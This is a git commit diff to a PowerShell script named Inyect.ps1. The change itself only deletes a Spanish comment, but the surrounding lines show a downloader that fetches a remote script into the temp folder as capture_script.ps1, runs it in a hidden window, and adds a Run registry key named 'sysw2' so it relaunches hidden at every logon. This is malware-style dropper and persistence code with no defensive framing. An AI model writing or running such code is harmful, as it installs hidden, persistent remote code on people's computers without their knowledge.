0687045e0314c79d316ec3c7bbf777dce8199626
Gerper90 <43889986+Gerper90@users.noreply.github.com>
2024-02-10 22:29:36 -0500

    Update Inyect.ps1

--- Inyect.ps1
+++ Inyect.ps1
@@ -3,6 +3,5 @@ $scriptPath = "$env:temp\capture_script.ps1"
 Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath
 Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-File $scriptPath"
 
-# Agregar entrada al registro de usuario actual para iniciar con el sistema de forma oculta
 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 Set-ItemProperty -Path $regPath -Name "sysw2" -Value "powershell.exe -WindowStyle Hidden -File $scriptPath"
